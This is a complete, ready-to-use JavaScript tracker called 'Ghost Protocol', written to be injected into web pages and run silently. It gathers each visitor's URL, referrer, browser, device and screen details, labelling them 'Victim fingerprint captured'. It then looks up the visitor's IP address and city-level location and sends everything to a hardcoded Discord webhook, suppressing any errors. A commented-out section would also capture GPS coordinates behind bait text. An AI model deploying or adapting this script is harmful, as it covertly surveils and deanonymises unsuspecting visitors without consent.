// Ghost Protocol — Discord Webhook Logger (Pure JS — no HTML)
// Inject & run silently

(function() {
  const WEBHOOK = "https://discord.com/api/webhooks/1450215350204633281/Ijfz8RQ66w6dsAUmTr2rGYQyJKFGZoTcsL-lTBGHddUsXIOwNjLzxNnW6ciqR7c-x6yv";  
  // ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  // REPLACE WITH YOUR ACTUAL WEBHOOK URL

  const payload = {
    username: "Ghost • Hit",
    avatar_url: "https://i.imgur.com/4M34hi2.png", // optional — change or remove
    embeds: [{
      title: "New Connection • " + new Date().toLocaleString(),
      color: 0x00ff88,
      description: "Victim fingerprint captured",
      fields: [
        { name: "📍 URL",          value: "```" + window.location.href + "```", inline: false },
        { name: "↩ Referrer",      value: "```" + (document.referrer || "direct / none") + "```", inline: false },
        { name: "🖥 UA / Device",   value: "```" + navigator.userAgent + "```", inline: false },
        { name: "Screen",           value: "```" + screen.width + "×" + screen.height + "  (" + window.devicePixelRatio + "x)```", inline: true },
        { name: "Timezone",         value: "```" + Intl.DateTimeFormat().resolvedOptions().timeZone + "```", inline: true },
        { name: "Hardware",         value: "```Cores: " + (navigator.hardwareConcurrency || "?") + " • RAM: " + (navigator.deviceMemory || "?") + " GB```", inline: true }
      ],
      timestamp: new Date().toISOString(),
      footer: { text: "Ghost Protocol • injected" }
    }]
  };

  const json = JSON.stringify(payload);
  const blob = new Blob([json], { type: "application/json" });

  // Method 1 — Preferred: sendBeacon (most reliable client-side logging in 2026)
  let sent = false;
  if (navigator.sendBeacon) {
    try {
      sent = navigator.sendBeacon(WEBHOOK, blob);
    } catch (e) {}
  }

  // Method 2 — Fallback: no-cors fetch (often still delivers even if opaque)
  if (!sent) {
    fetch(WEBHOOK, {
      method: "POST",
      mode: "no-cors",           // key — avoids preflight rejection in many cases
      cache: "no-cache",
      redirect: "follow",
      referrerPolicy: "no-referrer",
      body: blob
    }).catch(() => {});          // silent — no console noise
  }

  // Bonus: silent IP geolocation grab (city-level, no prompt)
  fetch("https://ipwho.is/")
    .then(r => r.json())
    .then(d => {
      const loc = `${d.city || "?"} • ${d.region || "?"} • ${d.country || "?"}  (${d.latitude?.toFixed(4) || "?"} , ${d.longitude?.toFixed(4) || "?"})`;
      const ipEmbed = {
        embeds: [{
          title: "IP Lock",
          color: 0xffaa00,
          description: "```" + (d.ip || "unknown") + "\n" + loc + "```",
          timestamp: new Date().toISOString()
        }]
      };
      const ipBlob = new Blob([JSON.stringify(ipEmbed)], { type: "application/json" });
      navigator.sendBeacon?.(WEBHOOK, ipBlob) || fetch(WEBHOOK, {method:"POST", mode:"no-cors", body: ipBlob});
    })
    .catch(() => {});

  // Bonus 2: try GPS once (prompts user — only include if you want bait text first)
  // if ("geolocation" in navigator) {
  //   navigator.geolocation.getCurrentPosition(pos => {
  //     const gps = `${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)} (±${Math.round(pos.coords.accuracy)}m)`;
  //     const gpsEmbed = { embeds: [{ title: "GPS Fix", description: "```" + gps + "```", color: 0xff0000 }] };
  //     const gpsBlob = new Blob([JSON.stringify(gpsEmbed)], { type: "application/json" });
  //     navigator.sendBeacon?.(WEBHOOK, gpsBlob);
  //   }, () => {});
  // }

})();
